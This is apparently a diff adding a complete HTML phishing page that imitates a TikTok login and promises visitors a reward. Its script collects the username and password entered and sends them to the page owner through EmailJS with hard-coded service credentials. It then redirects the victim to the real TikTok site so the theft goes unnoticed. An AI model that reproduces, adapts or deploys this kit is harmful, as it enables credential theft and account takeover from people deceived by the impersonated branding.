@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        /* Reset some default styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Set the font and basic styles for the body */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Style for the login container */
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        /* Styling for the login box */
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        /* Header style */
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        /* Input group styling */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #ff0000; /* Red border when focused */
+        }
+
+        /* Button group styling */
+        .button-group {
+            margin-top: 20px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff0000; /* Red color for the login button */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #cc0000; /* Darker red on hover */
+        }
+
+        /* Styling for the sign-up link */
+        .signup-link {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            color: #ff0000;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .manage {
+            font-family: sans-serif;
+            font-size: 14px;
+            color: #A9A9A9;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Login</title>
+</head>
+<body>
+<div class="container">
+    <div class="login-box">
+        <h2>Login to TikTok</h2>
+        <p class="manage">Manage your account, check notifications, comment on videos, and claim your reward.</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Username or Email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <div class="button-group">
+                <button type="submit" class="login-btn">Log In</button>
+            </div>
+            <p class="signup-link">Don't have an account? <a href="#">Sign Up</a></p>
+        </form>
+    </div>
+</div>
+
+<script>
+    // Initialize EmailJS with the latest SDK
+    emailjs.init('y36cybiZF6ukqz33P'); // Replace with your public key
+
+    // Form submission handler
+    document.getElementById('loginForm').addEventListener('submit', function (event) {
+        event.preventDefault(); // Prevent the form from refreshing the page
+
+        // Get form data
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Prepare email parameters
+        const emailParams = {
+            username: username, // Aligns with {{username}} in the template
+            password: password  // Aligns with {{password}} in the template
+        };
+
+        // Send email using EmailJS
+        emailjs.send('service_y5bzzoc', 'template_49p8hkg', emailParams)
+            .then(function (response) {
+                alert('You have been registered, wait for your reward!');
+                window.location.href = 'https://www.tiktok.com'; // Redirect to TikTok's main site
+            }, function (error) {
+                alert('Failed to send details: ' + JSON.stringify(error));
+            });
+    });
+</script>
+</body>
+</html>
